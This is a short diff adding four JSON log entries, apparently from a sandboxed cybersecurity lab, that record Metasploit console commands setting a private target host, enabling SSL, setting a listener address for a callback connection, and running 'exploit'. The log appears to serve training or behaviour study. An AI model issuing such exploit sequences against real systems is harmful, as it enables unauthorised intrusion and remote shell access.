@@ -1,0 +1,4 @@
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:23:51.480164+02:00", "cmd_type": "msf-command", "cmd": "set rhost 172.18.1.5"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:23:55.454321+02:00", "cmd_type": "msf-command", "cmd": "set ssl true"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:24:09.224293+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:24:12.926218+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
